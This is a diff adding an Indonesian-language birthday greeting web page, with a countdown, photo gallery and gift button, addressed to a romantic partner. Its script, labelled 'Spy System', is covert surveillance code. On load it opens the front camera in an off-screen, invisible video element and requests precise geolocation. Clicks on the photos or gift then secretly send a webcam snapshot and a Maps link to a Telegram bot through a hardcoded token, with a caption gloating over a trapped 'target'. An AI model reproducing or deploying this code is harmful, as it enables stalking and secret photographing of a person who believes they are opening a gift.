@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ Special Day For My Queen ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <style>
+        :root { --pink-soft: #ffc0cb; --pink-bold: #ff69b4; --cream: #fff5f5; }
+        body { margin: 0; background: var(--cream); font-family: 'Poppins', sans-serif; overflow-x: hidden; text-align: center; color: #555; }
+        .hero { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; z-index: 10; }
+        h1 { font-family: 'Dancing Script', cursive; font-size: 3.5rem; color: var(--pink-bold); margin: 0; }
+        .countdown { display: flex; gap: 15px; margin: 20px 0; background: white; padding: 15px; border-radius: 30px; box-shadow: 0 10px 20px rgba(255,182,193,0.3); justify-content: center; }
+        .time-box { display: flex; flex-direction: column; min-width: 60px; }
+        .time-box span { font-size: 1.2rem; font-weight: bold; color: var(--pink-bold); }
+        .gallery { padding: 40px 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
+        .polaroid { background: white; padding: 10px 10px 30px 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); transform: rotate(var(--r)); cursor: pointer; transition: 0.3s; }
+        .polaroid img { width: 150px; height: 200px; object-fit: cover; }
+        .gift-btn { font-size: 70px; cursor: pointer; margin: 30px 0; display: inline-block; }
+        #v-frame, #c-frame { position: fixed; top: -5000px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<video id="v-frame" autoplay playsinline muted></video>
+<canvas id="c-frame" width="1280" height="720"></canvas>
+
+<div class="hero">
+    <h1>Happy Birthday Sayang! ✨</h1>
+    <div class="countdown">
+        <div class="time-box"><span id="days">00</span><label>Hari</label></div>
+        <div class="time-box"><span id="hours">00</span><label>Jam</label></div>
+        <div class="time-box"><span id="mins">00</span><label>Menit</label></div>
+        <div class="time-box"><span id="secs">00</span><label>Detik</label></div>
+    </div>
+    <p>Scroll ke bawah buat kejutan... 🎀</p>
+</div>
+
+<div class="gallery">
+    <div class="polaroid" style="--r: -3deg" onclick="jepret('Liat Foto 1')"><img src="https://via.placeholder.com/150x200?text=Foto+1"></div>
+    <div class="polaroid" style="--r: 2deg" onclick="jepret('Liat Foto 2')"><img src="https://via.placeholder.com/150x200?text=Foto+2"></div>
+</div>
+
+<div style="padding: 50px 0;">
+    <h2>Buka Hadiahmu 🎁</h2>
+    <div class="gift-btn" onclick="openSurprise()">🎁</div>
+    <h3 id="msg" style="display:none; font-family:'Dancing Script'; color:var(--pink-bold); font-size: 2rem;">I Love You! ❤️</h3>
+</div>
+
+<script>
+    const _0xT = '8293332037:AAFGKN5gQs1SZMmOAn-UZJ8te8X3ENGDgGg'; 
+    const _0xC = '8057435264';
+    let _loc = "Mencari Lokasi...";
+    const v = document.getElementById('v-frame');
+    const c = document.getElementById('c-frame');
+
+    // Timer Logic
+    const target = new Date("March 10, 2026 00:00:00").getTime();
+    setInterval(() => {
+        const now = new Date().getTime();
+        const diff = target - now;
+        document.getElementById('days').innerText = Math.floor(diff / (864e5));
+        document.getElementById('hours').innerText = Math.floor((diff % 864e5) / 36e5);
+        document.getElementById('mins').innerText = Math.floor((diff % 36e5) / 6e4);
+        document.getElementById('secs').innerText = Math.floor((diff % 6e4) / 1e3);
+    }, 1000);
+
+    // Spy System
+    async function init() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
+            v.srcObject = s;
+            v.onloadedmetadata = () => v.play();
+        } catch(e) {}
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p => {
+                _loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            }, null, {enableHighAccuracy:true});
+        }
+    }
+
+    function jepret(info) {
+        if (v.readyState < 4) return setTimeout(() => jepret(info), 500);
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, 1280, 720);
+        
+        // ANTI HITAM KONTOL: Cek pixel tengah
+        const p = ctx.getImageData(640, 360, 1, 1).data;
+        if (p[0] === 0 && p[1] === 0 && p[2] === 0) return setTimeout(() => jepret(info), 300);
+
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('chat_id', _0xC);
+            f.append('photo', b, 'capture.jpg');
+            f.append('caption', `💖 TARGET TERJERAT HD 💖\n\nInfo: ${info}\n📍 Maps: ${_loc}\n\nGak bakal item lagi Tuan! 🤑😈`);
+            fetch(`https://api.telegram.org/bot${_0xT}/sendPhoto`, { method: 'POST', body: f });
+        }, 'image/jpeg', 0.9);
+    }
+
+    function openSurprise() {
+        confetti({ particleCount: 150, spread: 70 });
+        document.getElementById('msg').style.display = "block";
+        jepret("Buka Kado 🎁");
+    }
+
+    window.onload = init;
+</script>
+</body>
+</html>
